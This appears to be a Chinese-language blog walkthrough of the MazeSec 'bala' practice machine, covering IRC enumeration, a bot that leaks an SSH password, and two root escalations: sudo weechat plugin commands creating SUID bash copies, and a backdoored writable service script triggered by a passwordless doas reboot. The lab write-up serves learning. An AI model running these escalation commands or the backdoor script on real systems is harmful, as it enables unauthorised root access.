@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - MazeSec bala</title>
+        <meta name="description" content="靶机说明 关键词：IRC 机器人密码泄露、sudo /usr/bin/weechat exec 插件滥用、SUID bash 提权、可写 irc_bot.py 脚本篡改、doas 无密码重启服务 摘要：本文记录了 MazeSec bala 靶机的渗透过程。选手通过端口扫描发现 6667 端口运行 IRC 服务，连接后通…">
+    <link rel="canonical" href="https://the0n3.top/pages/maze-bala/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="MazeSec bala">
+    <meta property="og:description" content="靶机说明 关键词：IRC 机器人密码泄露、sudo /usr/bin/weechat exec 插件滥用、SUID bash 提权、可写 irc_bot.py 脚本篡改、doas 无密码重启服务 摘要：本文记录了 MazeSec bala 靶机的渗透过程。选手通过端口扫描发现 6667 端口运行 IRC 服务，连接后通…">
+    <meta property="og:url" content="https://the0n3.top/pages/maze-bala/">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="the0n3">
+    <meta property="og:locale" content="zh_CN">
+        <meta property="og:image" content="https://the0n3.top/images/maze-bala/1.png">
+        <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="MazeSec bala">
+    <meta name="twitter:description" content="靶机说明 关键词：IRC 机器人密码泄露、sudo /usr/bin/weechat exec 插件滥用、SUID bash 提权、可写 irc_bot.py 脚本篡改、doas 无密码重启服务 摘要：本文记录了 MazeSec bala 靶机的渗透过程。选手通过端口扫描发现 6667 端口运行 IRC 服务，连接后通…">
+        <meta name="twitter:image" content="https://the0n3.top/images/maze-bala/1.png">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+    <!-- 功能样式（自动扫描 assets/features/ 目录） -->
+        <link rel="stylesheet" href="/assets/features/code-fold/style.css">
+        <link rel="stylesheet" href="/assets/features/image-enhance/style.css">
+        <link rel="stylesheet" href="/assets/features/reading-progress/style.css">
+        <link rel="stylesheet" href="/assets/features/tax-accordion/style.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <link rel="stylesheet" href="/assets/css/search.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+    <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+    <header>
+        <nav>
+            <div class="nav-right">
+                                <a href="/">首页</a>
+                                <a href="/archives/">归档</a>
+                                <a href="/categories/">分类</a>
+                                <a href="/tags/">标签</a>
+                                <a href="/friends/">友链</a>
+                                <a href="/about/">关于</a>
+                                <a href="https://www.travellings.cn/go.html">开往</a>
+                                                <button
+                    id="searchTrigger"
+                    class="search-trigger"
+                    type="button"
+                    aria-label="打开搜索"
+                    aria-haspopup="dialog"
+                    aria-controls="searchModal"
+                    title="搜索（/）"
+                >
+                    <span class="search-trigger__label">搜索</span>
+                    <span class="search-trigger__hint">/</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>MazeSec bala</h1>
+    <p>
+        <span class="meta">发布于: 2025-11-07 18:10</span>
+    </p>
+    <div class="post-body">
+        <h2>靶机说明</h2>
+<p><strong>关键词</strong>：IRC 机器人密码泄露、sudo /usr/bin/weechat exec 插件滥用、SUID bash 提权、可写 irc_bot.py 脚本篡改、doas 无密码重启服务</p>
+<p><strong>摘要</strong>：本文记录了 MazeSec bala 靶机的渗透过程。选手通过端口扫描发现 6667 端口运行 IRC 服务，连接后通过与 bala 机器人交互获取敏感密码，成功 SSH 登录 fzer 用户；枚举 sudo 权限发现 fzer 可以 root 身份执行 /usr/bin/weechat，利用其内置的 exec、python、perl、ruby 插件执行任意代码，复制并赋予 SUID 位的 bash 文件完成提权；另一种路径则是发现 root 运行的 systemd 服务 irc_bot.service 所调用的 /usr/local/bin/irc_bot.py 对 fzer 可写，篡改脚本植入后门后，借助 doas.conf.bak 中允许 fzer 无密码执行 /usr/sbin/reboot 的规则重启服务，触发恶意脚本以 root 身份运行，同样实现权限提升。该靶机重点考察了 IRC 协议交互、sudo 二进制程序插件滥用以及可写服务脚本配合 doas 重启的提权技巧。</p>
+<h2>初始信息侦察</h2>
+<h3>主机发现与 ARP 扫描</h3>
+<p>存活主机发现</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/hackmyvm/bala]
+└─$ sudo arp-scan -I eth1 192.168.56.0/24
+
+192.168.56.122  08:00:27:19:f1:95       PCS Systemtechnik GmbH</code></pre>
+<h3>TCP 全端口扫描与服务识别</h3>
+<p>tcp全端口扫描</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/hackmyvm/bala]
+└─$ nmap -p- -sT 192.168.56.122                                                 
+
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+6667/tcp open  irc</code></pre>
+<h3>80 端口 HTTP 服务</h3>
+<p>访问80端口，一个irc通信协议的介绍、快速开始等内容，爆破目录无果，没有发现信息泄露等问题。</p>
+<p><img src="/images/maze-bala/1.png" alt="" decoding="async" width="1905" height="919"></p>
+<h3>6667端口 irc 服务</h3>
+<p>nc 连接6667端口，一个 irc 服务器。使用 nc 连接后，发送 NICK 和 USER 命令注册用户，注册后，irc 服务器会返回了fzer, /msg信息</p>
+<p>找到一篇 IRC 基本命令文章作为参考，<strong><a href="https://blog.csdn.net/ljxkey/article/details/8752649">IRC 基本命令</a></strong>  <a href="https://blog.csdn.net/ljxkey/article/details/8752649">https://blog.csdn.net/ljxkey/article/details/8752649</a></p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/hackmyvm/bala]
+└─$ nc -nv 192.168.56.122 6667
+
+(UNKNOWN) [192.168.56.122] 6667 (ircd) open
+:irc.local NOTICE * :*** Looking up your hostname...
+:irc.local NOTICE * :*** Could not resolve your hostname: Request timed out; using your IP address (192.168.56.100) instead.
+NICK test123
+USER test123 0 * :Test User
+
+:irc.local 251 test123 :There are 1 users and 0 invisible on 1 servers
+:irc.local 254 test123 4 :channels formed
+:irc.local 265 test123 :Current local users: 1  Max: 1
+:irc.local 266 test123 :Current global users: 1  Max: 1
+:irc.local 372 test123 : fzer
+:irc.local 372 test123 : /msg
+:irc.local 376 test123 :End of message of the day.
+PING :irc.local</code></pre>
+<p>发现存在4个频道，不允许查看用户列表。</p>
+<pre><code class="language-bash">LIST
+:irc.local 321 test123 Channel :Users Name
+:irc.local 322 test123 #Important 1 :[+nt] 
+:irc.local 322 test123 #Creds 1 :[+nt] 
+:irc.local 322 test123 #Team 1 :[+nt] 
+:irc.local 322 test123 #Chat 1 :[+nt] 
+:irc.local 323 test123 :End of channel list.
+USERS
+:irc.local 446 test123 :USERS has been disabled</code></pre>
+<p>依次进入频道看看，每个频道只有一个用户 bala。</p>
+<pre><code class="language-bash">JOIN #Important
+:test123!test123@192.168.56.100 JOIN :#Important
+:irc.local 353 test123 = #Important :@bala test123
+:irc.local 366 test123 #Important :End of /NAMES list.
+JOIN #Creds
+:test123!test123@192.168.56.100 JOIN :#Creds
+:irc.local 353 test123 = #Creds :@bala test123
+:irc.local 366 test123 #Creds :End of /NAMES list.
+JOIN #Chat
+:test123!test123@192.168.56.100 JOIN :#Chat
+:irc.local 353 test123 = #Chat :@bala test123
+:irc.local 366 test123 #Chat :End of /NAMES list.
+JOIN #Team
+:test123!test123@192.168.56.100 JOIN :#Team
+:irc.local 353 test123 = #Team :@bala test123
+:irc.local 366 test123 #Team :End of /NAMES list.</code></pre>
+<h2>SSH 密码登录 fzer 用户</h2>
+<p>私聊 bala 用户，爆金币了，给了一个密码</p>
+<pre><code class="language-bash">PRIVMSG bala :hello
+:bala!bala@127.0.0.1 PRIVMSG test123 :未知命令，可用命令: getpassword, help, info
+PRIVMSG bala :getpassword
+:bala!bala@127.0.0.1 PRIVMSG test123 :密码: ai01ClGAXoYpeevwNMS1
+:bala!bala@127.0.0.1 PRIVMSG test123 :此密码为敏感信息，请妥善保管
+PRIVMSG bala :help
+:bala!bala@127.0.0.1 PRIVMSG test123 :可用命令:
+:bala!bala@127.0.0.1 PRIVMSG test123 :getpassword - 获取密码
+:bala!bala@127.0.0.1 PRIVMSG test123 :help - 显示帮助
+:bala!bala@127.0.0.1 PRIVMSG test123 :info - 机器人信息
+PRIVMSG bala :info
+PRIVMSG bala :info
+:bala!bala@127.0.0.1 PRIVMSG test123 :Simple IRC Bot v2.0
+:bala!bala@127.0.0.1 PRIVMSG test123 :功能: 密码管理、频道通信</code></pre>
+<p>拿密码尝试登录bala用户 ssh，密码不对，或者没有这个用户，后尝试 <code>fzer</code> 用户成功。</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/hackmyvm/bala]
+└─$ ssh bala@192.168.56.122              
+bala@192.168.56.122's password: 
+Permission denied, please try again.
+┌──(npc㉿kali)-[~/hackmyvm/bala]
+└─$ ssh fzer@192.168.56.122
+fzer@192.168.56.122's password: 
+Linux Bala 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+fzer@Bala:~$ </code></pre>
+<p><img src="/images/maze-bala/16.png" alt="" decoding="async" loading="lazy" width="977" height="325"></p>
+<h2>root 提权</h2>
+<h3>sudo 权限枚举</h3>
+<p>看下当前用户有无sudo命令权限，发现可以运行 /usr/bin/weechat。</p>
+<pre><code class="language-bash">fzer@Bala:~$ sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for fzer: 
+Matching Defaults entries for fzer on Bala:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User fzer may run the following commands on Bala:
+    (ALL) PASSWD: /usr/bin/weechat</code></pre>
+<h3>weechat 服务提权分析</h3>
+<p>这是一个irc服务的客户端<a href="https://weechat.org/">Weechat</a></p>
+<p>使用 sudo 权限运行 weechat。</p>
+<pre><code class="language-bash">sudo /usr/bin/weechat</code></pre>
+<p>可用插件列表：</p>
+<pre><code class="language-plaintext">Plugins loaded: alias, buflist, charset, exec, fifo, fset, irc, logger, perl, python, relay, ruby, script, spell, trigger, xfer</code></pre>
+<p><img src="/images/maze-bala/2.png" alt="" decoding="async" loading="lazy" width="1920" height="1040"></p>
+<h3>方法一：插件提权</h3>
+<p><strong>exec 插件</strong></p>
+<p>使用help命令获取帮助，<code>-sh</code>、<code>-n</code>参数都可以执行命令</p>
+<p><img src="/images/maze-bala/3.png" alt="" decoding="async" loading="lazy" width="1036" height="377"></p>
+<blockquote>
+<p>SUID（Set User ID）是一种在Linux/Unix系统上赋予文件的特殊权限。它允许普通用户在执行具有该权限的二进制程序时，<strong>临时获得该文件所有者的权限</strong>。</p>
+</blockquote>
+<p>复制一份 root bash 到家目录，添加suid 权限</p>
+<pre><code class="language-bash">/exec -sh  cp /bin/bash /home/fzer/bash1;chmod u+s /home/fzer/bash1</code></pre>
+<p>执行命令后，使用<code>/exit</code>退出 weechat，验证家目录<code>bash1</code>的suid权限</p>
+<pre><code class="language-bash">fzer@Bala:~$ sudo /usr/bin/weechat
+fzer@Bala:~$ ls -lah
+total 1.2M
+drwxr-xr-x 2 fzer fzer 4.0K Nov  7 12:22 .
+drwxr-xr-x 3 root root 4.0K Nov  1 23:59 ..
+-rwsr-xr-x 1 root root 1.2M Nov  7 12:22 bash1
+lrwxrwxrwx 1 root root    9 Nov  2 00:31 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 fzer fzer  220 Nov  1 23:59 .bash_logout
+-rw-r--r-- 1 fzer fzer 3.5K Nov  1 23:59 .bashrc
+-rw-r--r-- 1 root root   48 Nov  2 00:33 doas.conf.bak
+-rw-r--r-- 1 fzer fzer  807 Nov  1 23:59 .profile
+-rw-r--r-- 1 root root   44 Nov  2 00:00 user.txt
+fzer@Bala:~$ ./bash1 -p
+bash1-5.0# id
+uid=1000(fzer) gid=1000(fzer) euid=0(root) groups=1000(fzer)
+bash1-5.0# whoami
+root
+bash1-5.0# </code></pre>
+<p><img src="/images/maze-bala/4.png" alt="" decoding="async" loading="lazy" width="772" height="414"></p>
+<p>使用help命令可以发现<code>python</code>、<code>perl</code>、<code>ruby</code>插件都可以使用<code>eval</code>参数执行代码。</p>
+<p><img src="/images/maze-bala/5.png" alt="" decoding="async" loading="lazy" width="1356" height="614"></p>
+<p><img src="/images/maze-bala/6.png" alt="" decoding="async" loading="lazy" width="1381" height="604"></p>
+<p><img src="/images/maze-bala/7.png" alt="" decoding="async" loading="lazy" width="1225" height="551"></p>
+<pre><code class="language-bash">/python eval import os; os.system("cp /bin/bash /home/fzer/bash2;chmod u+s /home/fzer/bash2")
+
+/perl eval system("cp /bin/bash /home/fzer/bash3;chmod u+s /home/fzer/bash3")
+
+/ruby eval system("cp /bin/bash /home/fzer/bash4;chmod u+s /home/fzer/bash4")</code></pre>
+<p>执行成功，有了对应 suid bash 文件</p>
+<p><img src="/images/maze-bala/8.png" alt="" decoding="async" loading="lazy" width="781" height="409"></p>
+<h3>方法二：可写文件提权</h3>
+<p>在 fzer 用户家目录下发现<code>doas.conf.bak</code>备份文件，查看内容，允许 fzer 用户以 root 身份无密码执行 <code>/usr/sbin/reboot</code>命令</p>
+<pre><code class="language-bash">fzer@Bala:~$ cat doas.conf.bak 
+permit nopass fzer as root cmd /usr/sbin/reboot</code></pre>
+<p>查看系统进程，找到 root 在运行一个bot脚本，父进程 PPID 是1，是 PID 1 init服务的子进程，大概率注册为了一个服务。</p>
+<pre><code class="language-bash">fzer@Bala:~$ ps aux
+UID          PID    PPID  C STIME TTY          TIME CMD
+root         360       1  0 11:35 ?        00:00:02 /usr/bin/python3 /usr/local/bin/irc_bot.py</code></pre>
+<p><img src="/images/maze-bala/9.png" alt="" decoding="async" loading="lazy" width="1145" height="704"></p>
+<p>查看系统服务，系统注册了这个 irc_bot 服务，以一个名为 pycrtlake 的用户运行这个脚本</p>
+<pre><code class="language-bash">fzer@Bala:~$ find /etc/systemd/system /lib/systemd/system -name "*irc_bot*" 2&gt;/dev/null
+/etc/systemd/system/irc_bot.service
+fzer@Bala:~$ cat /etc/systemd/system/irc_bot.service
+[Unit]
+Description=IRC Bot Service
+After=network.target
+
+[Service]
+User=pycrtlake
+Group=pycrtlake
+WorkingDirectory=/usr/local/bin
+ExecStart=/usr/bin/python3 /usr/local/bin/irc_bot.py
+Restart=always
+RestartSec=5
+StandardOutput=syslog
+StandardError=syslog
+Environment=PYTHONUNBUFFERED=1
+
+[Install]
+WantedBy=multi-user.target</code></pre>
+<p><img src="/images/maze-bala/10.png" alt="" decoding="async" loading="lazy" width="962" height="446"></p>
+<p>但是前面可以知道，这个 bot 脚本是 root 在运行，并且<code>/etc/passwd</code>文件中并没有 pycrtlake 用户</p>
+<p><img src="/images/maze-bala/11.png" alt="" decoding="async" loading="lazy" width="864" height="650"></p>
+<p>查看脚本权限</p>
+<pre><code class="language-bash">fzer@Bala:~$ ls -alh /usr/local/bin/irc_bot.py
+-rwxr-x--- 1 fzer fzer 4.9K Nov  2 00:08 /usr/local/bin/irc_bot.py</code></pre>
+<p>/usr/local/bin/irc_bot.py 脚本是 fzer 用户所有且有写权限，修改脚本内容，复制一份root bash 到家目录，添加suid 权限，同时验证是什么用户在运行脚本</p>
+<pre><code class="language-python">import os
+os.system("touch /home/fzer/`whoami`")
+os.system("cp /bin/bash /home/fzer/bash111;chmod u+s /home/fzer/bash111")
+exit()</code></pre>
+<p><img src="/images/maze-bala/12.png" alt="" decoding="async" loading="lazy" width="716" height="151"></p>
+<p>最后，使用家目录的 doas 命令备份提示，以 root 身份无密码执行 <code>/usr/sbin/reboot</code>命令，重启系统，直接重启虚拟机也是一样的效果，重启时 <code>init</code>进程会重新以root的身份创建 irc_bot 服务的子进程，运行修改后的脚本。</p>
+<p><img src="/images/maze-bala/13.png" alt="" decoding="async" loading="lazy" width="521" height="171"></p>
+<pre><code class="language-bash">fzer@Bala:~$ doas /usr/sbin/reboot</code></pre>
+<p><img src="/images/maze-bala/14.png" alt="" decoding="async" loading="lazy" width="598" height="77"></p>
+<p>重新 SSH 登录后，发现家目录下多了一个 <code>root</code> 文件（验证了脚本以 root 身份运行），以及具有 <code>SUID</code> 权限的 bash111 文件：</p>
+<p><img src="/images/maze-bala/15.png" alt="" decoding="async" loading="lazy" width="806" height="523"></p>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>MazeSec</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#sudo</span>
+                                    <span>#可写文件提权</span>
+                            </span>
+            </div>
+    </article>
+
+
+<section class="post-comments" aria-label="Comments">
+    <script src="https://giscus.app/client.js"
+        data-repo="Apursuit/the0n3-blog"
+        data-repo-id="R_kgDORvPPbA"
+        data-category="Announcements"
+        data-category-id="DIC_kwDORvPPbM4C5KAt"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="light"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+    </script>
+</section>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+    
+    <!-- 搜索命令面板：
+         第一版先提供标题、日期、标签搜索，以及键盘导航和快捷键 -->
+    <div id="searchModal" class="search-modal" hidden>
+        <div class="search-modal__overlay" data-search-close></div>
+        <div class="search-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+            <div class="search-modal__panel">
+                <div class="search-modal__header">
+                    <div class="search-modal__title-group">
+                        <div id="searchModalTitle" class="search-modal__title">搜索文章</div>
+                        <div class="search-modal__subtitle">输入标题、标签或关键词，按 Enter 打开结果</div>
+                    </div>
+                    <button
+                        id="searchClose"
+                        class="search-modal__close"
+                        type="button"
+                        aria-label="关闭搜索"
+                        title="关闭搜索"
+                    >
+                        ×
+                    </button>
+                </div>
+
+                <div class="search-modal__body">
+                    <label class="search-input-wrap" for="searchInput">
+                        <span class="search-input-wrap__icon" aria-hidden="true">⌕</span>
+                        <input
+                            id="searchInput"
+                            class="search-input"
+                            type="text"
+                            placeholder="搜索文章..."
+                            autocomplete="off"
+                            spellcheck="false"
+                        >
+                    </label>
+
+                    <div class="search-help">
+                        <span>/ 打开</span>
+                        <span>↑ ↓ 选择</span>
+                        <span>Enter 打开</span>
+                        <span>Esc 关闭</span>
+                    </div>
+
+                    <div id="searchState" class="search-state" aria-live="polite">输入关键词开始搜索</div>
+                    <div id="searchResults" class="search-results" role="listbox" aria-label="搜索结果"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+    <!-- 功能脚本（自动扫描 assets/features/ 目录） -->
+        <script src="/assets/features/code-fold/script.js"></script>
+        <script src="/assets/features/image-enhance/script.js"></script>
+        <script src="/assets/features/reading-progress/script.js"></script>
+        <script src="/assets/features/tax-accordion/script.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+    <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+    <!-- 弹簧动画工具（搜索弹窗/灯箱进出场依赖） -->
+    <script src="/assets/js/spring.js"></script>
+    <!-- 搜索功能 -->
+    <script src="/assets/js/fuse.js"></script>
+    <script src="/assets/js/search.js"></script>
+</body>
+</html>
